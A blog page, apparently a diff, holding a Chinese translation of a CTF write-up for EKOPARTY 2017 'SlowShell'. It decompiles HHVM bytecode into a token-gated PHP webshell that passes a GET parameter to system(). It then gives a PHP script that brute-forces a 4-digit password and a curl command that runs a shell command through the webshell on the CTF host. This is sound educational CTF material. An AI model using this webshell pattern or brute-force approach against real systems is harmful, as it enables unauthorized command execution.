@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta http-equiv="content-language" content="zh-CN" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=0.5">
+    
+    
+    <title>EKOPARTY CTF 2017: SlowShell （译）</title>
+
+    
+
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.2.0/anchor.min.js"></script>
+        <script>
+            document.addEventListener("DOMContentLoaded", function(event) {
+                anchors.options = {
+                visible: 'hover',
+                placement: 'left',
+                icon: "¶"
+                };
+            anchors.add();
+            })
+        </script>
+        
+        
+
+        
+            <script src="https://cdn.bootcss.com/clipboard.js/2.0.4/clipboard.min.js"></script>
+            <link href="https://clipboardjs.com/bower_components/primer-css/css/primer.css" rel="stylesheet">
+            
+        
+
+        
+        
+        <style type="text/css">
+            body {background-color: #fbf6ec;}
+        </style>
+        
+
+        
+        
+             <link rel="stylesheet" href="/css/main.css"></link> <link rel="stylesheet" href="/css/stylesheet.css"></link> <link rel="stylesheet" href="https://codisec.com/wp-content/themes/codisec-strappress/style.css?ver=3.3.6"></link>
+        
+
+        
+    
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css" rel="stylesheet">
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>
+    
+
+    
+    
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+
+</head>
+
+
+<body>
+    <script>
+        window.addEventListener("resize", resizeThrottler, false);
+
+        var resizeTimeout;
+        function resizeThrottler() {
+        
+        if ( !resizeTimeout ) {
+            resizeTimeout = setTimeout(function() {
+            resizeTimeout = null;
+            actualResizeHandler();
+        
+            
+            }, 66);
+        }
+        }
+        actualResizeHandler()
+        function actualResizeHandler() {
+                if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent))
+                {
+                    document.body.classList.add('mobile');
+                }else{
+                    document.body.classList.remove('mobile');  
+                }
+    }</script>
+
+    
+    
+
+
+    
+
+<div class="inner" style="position:relative;">
+  
+  <div class="side-btn"><a href="/pass-blog/" class="back">Home</a></div>
+  
+<div class="blog-post">
+  <h2>EKOPARTY CTF 2017: SlowShell （译）</h2>
+        
+
+<style>
+body{
+    background-color: #272b30;
+    color:#f9f1f1;
+    font-size:1.1em;
+}
+
+a {
+  color:#f1851a;
+}
+pre {
+    background-color: #272b30;
+}
+p {
+    color: #c8c8c8;
+}
+
+li code,
+p code {
+    background-color: rgb(34, 40, 42) !important;
+    color: #f1851a;
+}
+div.inner {
+    background-color: #272b30;
+}
+</style>
+
+<h2 id="博文来源">博文来源</h2>
+
+<blockquote>
+<p><a href="https://codisec.com/ekoparty-ctf-2017-slowshell/">源文</a> ：2017 9-29 ，作者：<a href="https://codisec.com/author/hubert-jasudowicz/">Hubert Jasudowicz</a></p>
+</blockquote>
+
+<ul>
+<li>CTF：EKOPARTY CTF 2017</li>
+<li>积分：498（由 2 支团队解决）</li>
+<li>类别：Web，RE</li>
+</ul>
+
+<h2 id="描述">描述</h2>
+
+<p>在这次挑战中，我们获得了一个 Web 服务器 URL -<a href="http://hhvm.ctf.site:10080/">http://hhvm.ctf.site:10080/</a>，和两个用于运行服务的 shell 命令：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hhvm --hphp -t hhbc -v <span style="color:#8be9fd;font-style:italic">AllVolatile</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">true</span> --input-dir . -o HHVM</code></pre></div>
+<p>和：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hhvm -m server -d hhvm.server.type<span style="color:#ff79c6">=</span>proxygen <span style="color:#f1fa8c">\
+</span><span style="color:#f1fa8c"></span>                 -d hhvm.server.port<span style="color:#ff79c6">=</span><span style="color:#bd93f9">8080</span> <span style="color:#f1fa8c">\
+</span><span style="color:#f1fa8c"></span>                 -d hhvm.repo.authoritative<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">true</span> <span style="color:#f1fa8c">\
+</span><span style="color:#f1fa8c"></span>                 -d hhvm.repo.central.path<span style="color:#ff79c6">=</span>./HHVM/hhvm.hhbc</code></pre></div>
+<h2 id="关于-hhvm">关于 hhvm</h2>
+
+<p>HHVM 是由 Facebook 开发的 PHP 虚拟机，它使用 JIT 加速代码执行。PHP 脚本转换为 <code>HipHop 字节码-bytecode</code>（HHBC），进行优化，然后编译为原生机器码。</p>
+
+<p>默认情况下，HHVM 与 Zend Engine 的工作方式类似 - 它根据需要加载和运行 PHP 文件。虽然灵活，但这种方法效率极低，因为它几乎没有进行高级优化的空间。另一种方法是使用“repo authoritative”模式（在此挑战中使用），该模式的 HHVM 会构建 SQLite3 数据库（<code>hhvm.hhbc</code>），具有高度优化的字节码，以及运行所有脚本所需的其他元数据。</p>
+
+<h2 id="解">解</h2>
+
+<h3 id="获取-hhvm-hhbc">获取 hhvm.hhbc</h3>
+
+<p>我们需要做的第一件事是提取 储存 文件。幸运的是，它很容易访问，因为 Proxygen（内置 HTTP 服务器）会提供，运行目录中的所有文件。我们只要运行：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget http://hhvm.ctf.site:10080/HHVM/hhvm.hhbc</code></pre></div>
+<p>你可以在<a href="https://codisec.com/wp-content/uploads/2017/09/hhvm.hhbc_.zip">这里</a>下载。</p>
+
+<h3 id="发现-php-文件">发现 PHP 文件</h3>
+
+<p>现在，当我们有 储存 文件时，我们可以看到这幕后到底发生了什么。首先，让我们看看，在服务器上，可以找到哪些端点。为此，我们可以简单地加载数据库，并查看提示。其中一个有趣的表格包含：</p>
+
+<p><img src="https://codisec.com/wp-content/uploads/2017/09/files.png" alt="database-table" /></p>
+
+<h3 id="转储成字节码">转储成字节码</h3>
+
+<p>下一步是找出这两个 php 脚本，正在做什么。为此，我们可以将<code>-vEval.DumpBytecode = 1</code>标志，传递给 HHVM。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hhvm -d hhvm.repo.authoritative<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">true</span> <span style="color:#f1fa8c">\
+</span><span style="color:#f1fa8c"></span>       -d hhvm.repo.central.path<span style="color:#ff79c6">=</span>./HHVM/hhvm.hhbc <span style="color:#f1fa8c">\
+</span><span style="color:#f1fa8c"></span>       -vEval.DumpBytecode<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">[</span>filename<span style="color:#ff79c6">]</span></code></pre></div>
+<p>这命令将从储存文件中，提取并打印 HipHop 字节码。我已经包含了两个转储文件，以供参考，但我将跳过手动“逆转” PHP 代码这一步。我鼓励你自己尝试分析 HHBC。它作为一个简单的<a href="https://en.wikipedia.org/wiki/Stack_machine">堆栈结构机器</a>，其工作形式值得我们熟悉。在<a href="https://github.com/facebook/hhvm/blob/master/hphp/doc/bytecode.specification">这里</a>查看 HHBC 规范。</p>
+
+<blockquote>
+<p>下面是两个 php 文件的 HipHop 字节码。</p>
+</blockquote>
+
+<h4 id="shell-php">shell.php：</h4>
+
+<p><details></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">Pseudo-main at 0
+repoReturnType: Int
+maxStackCells: 5
+numLocals: 2
+numIterators: 0
+numClsRefSlots: 0
+  // line 3
+    0: String &#34;/etc/slow-auth.ini&#34;
+    5: False
+    6: Int 0
+   15: AssertRATStk 1 Bool
+   18: AssertRATStk 2 SStr
+   21: FCallBuiltin 3 1 &#34;parse_ini_file&#34;
+   28: UnboxRNop
+   29: SetL L:0
+   31: PopC
+  // line 5
+   32: String &#34;_GET&#34;
+   37: AssertRATStk 0 SStr
+   40: BaseGC 0 None
+   44: AssertRATStk 0 SStr
+   47: QueryM 1 Empty ET:&#34;token&#34;
+   56: AssertRATStk 0 Bool
+   59: JmpNZ 124 (183)
+   64: String &#34;_GET&#34;
+   69: AssertRATStk 0 SStr
+   72: BaseGC 0 None
+   76: AssertRATStk 0 SStr
+   79: QueryM 1 Empty ET:&#34;cmd&#34;
+   88: AssertRATStk 0 Bool
+   91: JmpNZ 92 (183)
+   96: String &#34;_GET&#34;
+  101: AssertRATStk 0 SStr
+  104: BaseGC 0 Warn
+  108: AssertRATStk 0 SStr
+  111: QueryM 1 CGet ET:&#34;token&#34;
+  120: BaseL L:0 Warn
+  124: QueryM 0 CGet ET:&#34;token&#34;
+  133: Same
+  134: JmpZ 49 (183)
+  // line 6
+  139: String &#34;Welcome admin!&lt;<span style="color:#ff79c6">br</span>/&gt;&#34;
+  144: Print
+  145: PopC
+  // line 7
+  146: String &#34;_GET&#34;
+  151: AssertRATStk 0 SStr
+  154: BaseGC 0 Warn
+  158: AssertRATStk 0 SStr
+  161: QueryM 1 CGet ET:&#34;cmd&#34;
+  170: NullUninit
+  171: FCallBuiltin 2 1 &#34;system&#34;
+  178: UnboxRNop
+  179: AssertRATStk 0 ?Str
+  182: PopC
+  183: Int 1
+  192: RetC
+Pseudo-main at 0
+repoReturnType: Int
+maxStackCells: 5
+numLocals: 2
+numIterators: 0
+numClsRefSlots: 0</code></pre></div>
+<p></details></p>
+
+<h4 id="shell-login-php">shell-login.php:</h4>
+
+<p><details></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">Pseudo-main at 0
+repoReturnType: Int
+maxStackCells: 12
+numLocals: 6
+numIterators: 0
+numClsRefSlots: 0
+ FPI 214-234; fpOff = 9
+ FPI 253-287; fpOff = 9
+  // line 3
+    0: String &#34;_POST&#34;
+    5: EmptyG
+    6: JmpNZ 369 (375)
+  // line 4
+   11: String &#34;_POST&#34;
+   16: AssertRATStk 0 SStr
+   19: BaseGC 0 Warn
+   23: AssertRATStk 0 SStr
+   26: QueryM 1 CGet ET:&#34;username&#34;
+   35: Int 0
+   44: Int 32
+   53: AssertRATStk 1 Int
+   56: FCallBuiltin 3 3 &#34;substr&#34;
+   63: UnboxRNop
+   64: SetL L:1
+   66: PopC
+  // line 5
+   67: String &#34;_POST&#34;
+   72: AssertRATStk 0 SStr
+   75: BaseGC 0 Warn
+   79: AssertRATStk 0 SStr
+   82: QueryM 1 CGet ET:&#34;password&#34;
+   91: Int 0
+  100: Int 4
+  109: AssertRATStk 1 Int
+  112: FCallBuiltin 3 3 &#34;substr&#34;
+  119: UnboxRNop
+  120: CastInt
+  121: CastString
+  122: SetL L:2
+  124: PopC
+  // line 6
+  125: Int 0
+  134: SetL L:3
+  // line 8
+  136: PopC
+  // line 6
+  137: Int 16
+  146: CGetL2 L:3
+  148: AssertRATStk 0 Int
+  151: Lt
+  152: JmpZ 46 (198)
+  // line 7
+  157: CGetL L:2
+  159: False
+  160: FCallBuiltin 2 1 &#34;md5&#34;
+  167: UnboxRNop
+  168: AssertRATStk 0 ?Str
+  171: SetL L:2
+  173: PopC
+  // line 6
+  174: IncDecL L:3 PostIncO
+  // line 8
+  177: PopC
+  // line 6
+  178: Int 16
+  187: CGetL2 L:3
+  189: AssertRATStk 0 Int
+  192: Lt
+  193: JmpNZ -36 (157)
+  // line 10
+  198: String &#34;EKO-ADMIN&#34;
+  203: CGetL2 L:1
+  205: AssertRATStk 0 SStr
+  208: Same
+  209: JmpZ 158 (367)
+  214: FPushFuncD 2 &#34;password_verify&#34;
+  220: CGetL L:2
+  222: FPassC 0
+  224: String &#34;$2y$12$tQdBpH9ZlMomuSxwpw/5Iuxe4xTdu8RbBG4ODCxyZPM0Hl3vpkC4q&#34;
+  229: FPassC 1
+  231: AssertRATStk 0 SStr
+  234: FCallD 2 &#34;&#34; &#34;password_verify&#34;
+  244: UnboxRNop
+  245: AssertRATStk 0 Bool
+  248: JmpZ 119 (367)
+  // line 11
+  253: FPushFuncD 3 &#34;password_hash&#34;
+  259: CGetL L:2
+  261: FPassC 0
+  263: Int 1
+  272: FPassC 1
+  274: Array array(&#34;cost&#34;=&gt;24,&#34;salt&#34;=&gt;&#34;3165613164316437343131346634616663323364623631393534316630336634653663353466373638373835&#34;)
+  279: FPassC 2
+  281: AssertRATStk 0 SArr
+  284: AssertRATStk 1 Int
+  287: FCallD 3 &#34;&#34; &#34;password_hash&#34;
+  297: UnboxRNop
+  298: False
+  299: FCallBuiltin 2 1 &#34;md5&#34;
+  306: UnboxRNop
+  307: AssertRATStk 0 ?Str
+  310: SetL L:4
+  312: PopC
+  // line 12
+  313: String &#34;Location: shell.php\?token=&#34;
+  318: String &#34;&amp;cmd=cat%20/etc/slow-webshell.txt&#34;
+  323: CGetL2 L:4
+  325: AssertRATStk 0 SStr
+  328: Concat
+  329: AssertRATStk 1 SStr
+  332: ConcatN 2
+  334: True
+  335: Int 0
+  344: AssertRATStk 1 Bool
+  347: AssertRATStk 2 Str
+  350: FCallBuiltin 3 1 &#34;header&#34;
+  357: UnboxRNop
+  358: AssertRATStk 0 InitNull
+  361: PopC
+  362: Jmp 13 (375)
+  // line 14
+  367: String &#34;&lt;<span style="color:#ff79c6">strong</span>&gt;Invalid username or password&lt;/<span style="color:#ff79c6">strong</span>&gt;&#34;
+  372: SetL L:5
+  374: PopC
+  // line 21
+  375: String &#34;&lt;<span style="color:#ff79c6">html</span>&gt;\n &lt;<span style="color:#ff79c6">head</span>&gt;\n  &lt;<span style="color:#ff79c6">title</span>&gt;Slow Webshell&lt;/<span style="color:#ff79c6">title</span>&gt;\n  &#34;
+  380: Print
+  381: PopC
+  382: String &#34;&lt;<span style="color:#ff79c6">s</span>&#34;
+  <span style="color:#50fa7b">387:</span> <span style="color:#50fa7b">Print</span>
+  <span style="color:#50fa7b">388:</span> <span style="color:#50fa7b">PopC</span>
+  // <span style="color:#50fa7b">line</span> <span style="color:#50fa7b">29</span>
+  <span style="color:#50fa7b">389:</span> <span style="color:#50fa7b">String</span> &#34;<span style="color:#50fa7b">tyle</span>&gt;\n   .login-form {text-align: center;}\n   input {margin: 5px;}\n  &lt;/<span style="color:#ff79c6">style</span>&gt;\n &lt;/<span style="color:#ff79c6">head</span>&gt;\n &lt;<span style="color:#ff79c6">body</span>&gt;\n  &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;login-form\&#34;</span>&gt;\n   &lt;<span style="color:#ff79c6">h2</span>&gt;Slow Webshell&lt;/<span style="color:#ff79c6">h2</span>&gt;\n   &#34;
+  394: Print
+  395: PopC
+  396: EmptyL L:5
+  398: JmpNZ 9 (407)
+  403: CGetL L:5
+  405: Print
+  406: PopC
+  // line 37
+  407: String &#34;   &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;POST\&#34;</span>&gt;\n    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;text\&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;username\&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;username\&#34;</span> <span style="color:#50fa7b">required</span> /&gt;&lt;<span style="color:#ff79c6">br</span>/&gt;\n    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;password\&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;password\&#34;</span> <span style="color:#50fa7b">placeholder</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;password\&#34;</span> <span style="color:#50fa7b">required</span> /&gt;&lt;<span style="color:#ff79c6">br</span>/&gt;\n    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;submit\&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;submit\&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">\&#34;Authenticate\&#34;</span> /&gt;\n   &lt;/<span style="color:#ff79c6">form</span>&gt;\n  &lt;/<span style="color:#ff79c6">div</span>&gt;\n &lt;/<span style="color:#ff79c6">body</span>&gt;\n&lt;/<span style="color:#ff79c6">html</span>&gt;\n&#34;
+  412: Print
+  413: PopC
+  414: Int 1
+  423: RetC
+Pseudo-main at 0
+repoReturnType: Int
+maxStackCells: 12
+numLocals: 6
+numIterators: 0
+numClsRefSlots: 0
+ FPI 214-234; fpOff = 9
+ FPI 253-287; fpOff = 9</code></pre></div>
+<p></details></p>
+
+<h3 id="漏洞">漏洞</h3>
+
+<p>好了，下面我们已经将字节码重写为 PHP，我们可以寻找一种方法，来对服务器进行<code>pwn</code>。</p>
+
+<blockquote>
+<p><code>pwn</code>是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”。</p>
+</blockquote>
+
+<h4 id="shell-php-1">shell.php：</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#8be9fd;font-style:italic">$conf</span> <span style="color:#ff79c6">=</span> parse_ini_file<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/etc/slow-auth.ini&#34;</span><span style="color:#ff79c6">)</span>;
+<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$_GET</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#39;token&#39;</span><span style="color:#ff79c6">]</span> <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">$_GET</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#39;cmd&#39;</span><span style="color:#ff79c6">])</span> <span style="color:#ff79c6">{</span>
+	<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$_GET</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#39;token&#39;</span><span style="color:#ff79c6">]</span> <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">$conf</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#39;token&#39;</span><span style="color:#ff79c6">])</span> <span style="color:#ff79c6">{</span>
+		<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Welcome admin!&lt;br/&gt;&#34;</span>;
+		system<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$_GET</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#39;cmd&#39;</span><span style="color:#ff79c6">])</span>;
+	<span style="color:#ff79c6">}</span>
+<span style="color:#ff79c6">}</span></code></pre></div>
+<p>此脚本可以运行任何 shell 命令，但需要未知令牌(token)。我们暂时离开下，继续。</p>
+
+<h4 id="shell-login-php-1">shell-login.php：</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (isset($_POST)) {
+	$user = substr($_POST[&#39;username&#39;], 0, 32);
+	$pass = substr($_POST[&#39;password&#39;], 0, 4); // ❤️
+
+	$pass = strval(intval($pass)); // ❤️
+
+	for ($i = 0; $i &lt; <span style="color:#ff79c6">16</span>; $<span style="color:#50fa7b">i</span>++) {
+		$<span style="color:#50fa7b">pass </span><span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">md5($pass);</span>
+	}
+
+	<span style="color:#50fa7b">if</span> ($<span style="color:#50fa7b">user </span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">=</span> &#39;<span style="color:#50fa7b">EKO-ADMIN</span>&#39; &amp;&amp; <span style="color:#50fa7b">password_verify</span>($<span style="color:#50fa7b">pass</span>, &#39;$<span style="color:#50fa7b">2y</span>$<span style="color:#50fa7b">12</span>$<span style="color:#50fa7b">tQdBpH9ZlMomuSxwpw</span>/<span style="color:#50fa7b">5Iuxe4xTdu8RbBG4ODCxyZPM0Hl3vpkC4q</span>&#39;)) {
+		$<span style="color:#50fa7b">options </span><span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">[</span>
+			&#39;<span style="color:#50fa7b">cost</span>&#39; =&gt; 24,
+			&#39;salt&#39; =&gt; &#34;3165613164316437343131346634616663323364623631393534316630336634653663353466373638373835&#34;
+		];
+		$token = md5(password_hash($pass, PASSWORD_BCRYPT, $options));
+		header(&#34;Location: shell.php?token=&#34; . $token . &#34;&amp;cmd=cat%20/etc/slow-webshell.txt&#34;);
+	} else {
+		$error = &#34;&lt;<span style="color:#ff79c6">strong</span>&gt;Invalid username or password&lt;/<span style="color:#ff79c6">strong</span>&gt;&#34;;
+	}
+}
+	echo &#34;&lt;<span style="color:#ff79c6">html</span>&gt;....&#34;;
+	echo &#34;&lt;<span style="color:#ff79c6">style</span>&gt;....&#34;;
+
+	if ($error) {
+		echo $error;
+	}
+
+	echo &#34;&lt;form&gt;.....&#34;;
+
+?&gt;</code></pre></div>
+<p>这脚本更有趣。要生成有效的令牌，我们必须发送正确的密码，但是正如在 ❤️ 代码行，所看到的那样，密码被截断为 4 个字母，然后转换为整数。这些转换将搜索空间，减少到最多 4 位数的数字 - 10 000 (0~9999)个不同的密码。此外，登录后，会生成一个令牌，我们将被重定向到<code>/shell.php?token=[token]&amp;cmd=cat%20/etc/slow-webshell.txt</code>，因此这可能是包含得分旗帜 🚩 的文件。</p>
+
+<h3 id="登录吧">登录吧</h3>
+
+<p>好的，现在我们知道要进入 shell 的所有内容。首先要做的，就是破解密码。我们将通过简单地遍历所有 10 000 个数字，计算 16xMD5 哈希作为密钥，并使用 <code>password_verify</code> 进行最终验证，来完成此操作。找到有效密码后，我们有两个选择：在登录表单中使用，让服务器计算出有效令牌。或是在本地生成它，并直接访问 <code>shell.php</code>。</p>
+
+<p>这是一个找到密码和令牌的脚本（警告 - 需要很长时间才能完成）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">&lt;<span style="color:#ff79c6">&lt;?php</span>
+<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">md5calc</span>(<span style="color:#8be9fd;font-style:italic">$s</span>) {
+        <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">16</span>; <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">++</span>) {
+                <span style="color:#8be9fd;font-style:italic">$s</span> <span style="color:#ff79c6">=</span> md5(<span style="color:#8be9fd;font-style:italic">$s</span>);
+        }
+        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$s</span>;
+}
+
+<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">print_token</span>(<span style="color:#8be9fd;font-style:italic">$p</span>) {
+        <span style="color:#8be9fd;font-style:italic">$options</span> <span style="color:#ff79c6">=</span> [
+                <span style="color:#f1fa8c">&#39;cost&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#bd93f9">24</span>,
+                <span style="color:#f1fa8c">&#39;salt&#39;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#f1fa8c">&#34;3165613164316437343131346634616663323364623631393534316630336634653663353466373638373835&#34;</span>
+        ];
+        <span style="color:#8be9fd;font-style:italic">$token</span> <span style="color:#ff79c6">=</span> md5(password_hash(<span style="color:#8be9fd;font-style:italic">$p</span>, PASSWORD_BCRYPT, <span style="color:#8be9fd;font-style:italic">$options</span>));
+        <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;Token: </span><span style="color:#f1fa8c">$token\n</span><span style="color:#f1fa8c">&#34;</span>;
+}
+
+<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#8be9fd;font-style:italic">$i</span> <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">10000</span>; <span style="color:#8be9fd;font-style:italic">$i</span><span style="color:#ff79c6">++</span>) {
+        <span style="color:#8be9fd;font-style:italic">$pass</span> <span style="color:#ff79c6">=</span> strval(<span style="color:#8be9fd;font-style:italic">$i</span>);
+        <span style="color:#8be9fd;font-style:italic">$pass</span> <span style="color:#ff79c6">=</span> md5calc(<span style="color:#8be9fd;font-style:italic">$pass</span>);
+        <span style="color:#ff79c6">if</span> (password_verify(<span style="color:#8be9fd;font-style:italic">$pass</span>, <span style="color:#f1fa8c">&#39;$2y$12$tQdBpH9ZlMomuSxwpw/5Iuxe4xTdu8RbBG4ODCxyZPM0Hl3vpkC4q&#39;</span>)) {
+                <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;Password: </span><span style="color:#f1fa8c">$i\n</span><span style="color:#f1fa8c">&#34;</span>;
+                print_token(<span style="color:#8be9fd;font-style:italic">$pass</span>);
+                <span style="color:#ff79c6">break</span>;
+        }
+}
+
+<span style="color:#ff79c6">?&gt;</span>
+</code></pre></div>
+<p>在找到令牌后, 我们简单 <code>curl</code> 来自 <code>shell-login.php</code> 的 URL，并夺得旗帜：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#f1fa8c">&#34;http://hhvm.ctf.site:10080/shell.php?token=8b5e48da54af5ef22fbd1045c10d3d58&amp;cmd=cat%20/etc/slow-webshell.txt&#34;</span>...EKO<span style="color:#ff79c6">{</span>m4st3r+of+HHVM+0pc0d35<span style="color:#ff79c6">}</span>...</code></pre></div>
+  </div>
+
+<br>
+  
+
+<button id="edit-button" class="icon-button" type="button" title="Fork and edit" aria-label="Fork and edit"
+aria-haspopup="true" aria-expanded="false" aria-controls="edit">
+<i class="fa fa-edit">编辑本文</i>
+</button>
+
+
+<br>
+
+
+
+<script src="/pass-blog/js/copyCode.js"></script>
+<script src="/pass-blog/js/tooltips.js"></script>
+
+
+<footer>
+    <p style="float:right;margin:0 1rem;">
+        &copy; 2019 <a href="https://github.com/chinanf-boy/pass-blog/issues">yobrave (Issue me).</a>
+        
+      </p>
+  <hr>
+  <hr>
+
+  
+
+  <ul class="tags"  style="float: left!important;">
+      
+        <span>标签:</span>
+        <li><a class="link" href="/pass-blog/tags/codisec%20CTF"> #codisec CTF </a></li>
+      
+      <span>  </span>
+        
+        <span>分类:</span>
+        <li><a class="link" href="/pass-blog/categories/blog"> #blog </a></li>
+      
+  </ul>
+  
+  <br>
+
+
+</footer>
+</div> 
+
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
+  crossorigin="anonymous"></script>
+<script src="https://netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-128555056-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-128555056-1');
+</script>
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.4/dist/medium-zoom.min.js"></script>
+
+<script>
+  const zoom = mediumZoom()
+  
+  zoom.attach("img")
+</script>
+
+
+
+
+
+
+<script>
+        document.getElementById("edit-button").addEventListener("click", function () {
+            var editWindow = window.open("https:\/\/github.com\/chinanf-boy\/pass-blog/edit/master/content/post\/EKOPARTY-CTF-2017:-SlowShell.md");
+        });</script>
+
+    
+
+
+
+
+</body>
+
+</html>
